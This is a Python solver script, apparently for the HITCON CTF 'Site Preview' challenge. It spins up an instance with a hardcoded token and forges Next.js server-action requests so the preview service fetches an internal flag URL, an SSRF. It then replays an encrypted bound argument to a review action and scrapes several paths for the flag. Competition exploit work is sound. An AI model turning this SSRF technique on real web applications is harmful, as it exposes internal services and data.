#!/usr/bin/env python3
"""Site Preview instancer probe + flag-URL review dump. Run on binder/any host that can TCP 443 to 35.189.187.25."""
import json, re, sys, time, urllib.parse, urllib.request, ssl

INST = "https://sitepreview.chal.hitconctf.com"
TOKEN = "dc524ceb-2cd6-43e3-8e5c-c49c9f4873a7"
CREATE = "40826ee1e38d462252e0a1f6761f0741fca9607bbe"
REVIEW = "400cce7790f1e3554d5a9d0db54d9870b9ca678be9"
CTX = ssl.create_default_context()

def log(*a):
    print(time.strftime("%H:%M:%S"), *a, flush=True)

def req(url, data=None, headers=None, method=None, timeout=30):
    h = {"User-Agent": "Mozilla/5.0 binder-sp/1.0", "Accept": "*/*"}
    if headers:
        h.update(headers)
    body = data if (data is None or isinstance(data, bytes)) else data.encode()
    r = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout, context=CTX) as resp:
            return resp.getcode(), dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()

def main():
    log("hello from binder/host")
    # show egress IP
    for ipurl in ["https://api.ipify.org", "https://ifconfig.me/ip"]:
        try:
            c, _, b = req(ipurl, timeout=10)
            log("egress", ipurl, c, b[:80])
            break
        except Exception as e:
            log("ip fail", ipurl, e)
    try:
        c, hdrs, b = req(INST + "/", timeout=20)
        log("INST GET", c, "len", len(b), b[:400].decode("utf-8","replace"))
    except Exception as e:
        log("INST GET FAIL", type(e).__name__, e)
        return 2
    text = b.decode("utf-8", "replace")
    if "Your IP" in text:
        m = re.search(r"Your IP:\s*([0-9.]+)", text)
        log("instancer sees IP", m.group(1) if m else "?")
    # stop then create
    try:
        c, _, b = req(INST + "/stop", data=urllib.parse.urlencode({"token": TOKEN}).encode(),
                      headers={"Content-Type": "application/x-www-form-urlencoded"}, method="POST", timeout=30)
        log("STOP", c, b[:200])
    except Exception as e:
        log("STOP err", e)
    time.sleep(1)
    try:
        c, hdrs, b = req(INST + "/create", data=urllib.parse.urlencode({"token": TOKEN}).encode(),
                         headers={"Content-Type": "application/x-www-form-urlencoded"}, method="POST", timeout=30)
        log("CREATE", c, "loc", hdrs.get("Location"), b[:800].decode("utf-8","replace"))
    except Exception as e:
        log("CREATE FAIL", type(e).__name__, e)
        return 3
    # parse instance URL
    body = b.decode("utf-8", "replace")
    m = re.search(r"https?://sitepreview\.chal\.hitconctf\.com:\d+", body)
    if not m:
        m = re.search(r"sitepreview\.chal\.hitconctf\.com:\d+", body)
    if not m:
        log("NO INSTANCE URL in create body")
        return 4
    base = m.group(0)
    if not base.startswith("http"):
        base = "http://" + base
    log("BASE", base)
    # Next-Action create preview of flag
    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    payload = (
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"1_{CREATE}\"\r\n\r\n"
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n"
        + json.dumps(["http://flag:3000/flag"]) +
        f"\r\n--{boundary}--\r\n"
    )
    try:
        c, _, b = req(base + "/", data=payload.encode(), headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Next-Action": CREATE,
            "Accept": "text/x-component",
        }, timeout=30)
        log("MKPREV", c, b[:1500].decode("utf-8","replace"))
    except Exception as e:
        log("MKPREV FAIL", e)
        return 5
    prev = re.search(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", b.decode("utf-8","replace"))
    if prev:
        pid = prev.group(0)
        log("PID", pid)
        # dump preview RSC to get bound review
        try:
            c, _, pb = req(base + "/preview/" + pid, headers={"RSC": "1", "Accept": "text/x-component"}, timeout=20)
            log("PREVIEW RSC", c, pb[:2000].decode("utf-8","replace"))
        except Exception as e:
            log("PREVIEW err", e)
            pb = b""
        bound = None
        # 1c:"ciphertext"
        mm = re.search(rb'1c:"([^"]+)"', pb)
        if mm:
            bound = mm.group(1).decode()
            log("BOUND", bound[:80])
        if bound:
            boundary = "----WebKitFormBoundaryRev"
            rpayload = (
                f"--{boundary}\r\nContent-Disposition: form-data; name=\"1_{REVIEW}\"\r\n\r\n"
                f"--{boundary}\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n"
                + json.dumps([{"bound": bound}]) +
                f"\r\n--{boundary}--\r\n"
            )
            # actually format is fd.append('0', JSON.stringify([bound]))
            rpayload = (
                f"--{boundary}\r\nContent-Disposition: form-data; name=\"1_{REVIEW}\"\r\n\r\n"
                f"--{boundary}\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n"
                + json.dumps([bound]) +
                f"\r\n--{boundary}--\r\n"
            )
            try:
                t0 = time.time()
                c, _, rb = req(base + "/preview/" + pid, data=rpayload.encode(), headers={
                    "Content-Type": f"multipart/form-data; boundary={boundary}",
                    "Next-Action": REVIEW,
                    "Accept": "text/x-component",
                }, timeout=40)
                log("REVIEW", c, "dt", int((time.time()-t0)*1000), rb[:1500].decode("utf-8","replace"))
            except Exception as e:
                log("REVIEW FAIL", e)
        time.sleep(2)
        for path in [f"/render/{pid}", f"/preview/{pid}", "/settings", "/api/snapshot",
                     "/captures/latest.jpg", "/snapshots/latest.jpg"]:
            try:
                c, h, db = req(base + path, timeout=20)
                ct = h.get("Content-Type","")
                log("DUMP", path, c, ct, "len", len(db), db[:800])
                if b"hitcon{" in db:
                    log("FLAGRAW", db)
                    print(re.findall(rb"hitcon\{[^}]+\}", db))
            except Exception as e:
                log("DUMP err", path, e)
    log("DONE")
    return 0

if __name__ == "__main__":
    sys.exit(main() or 0)
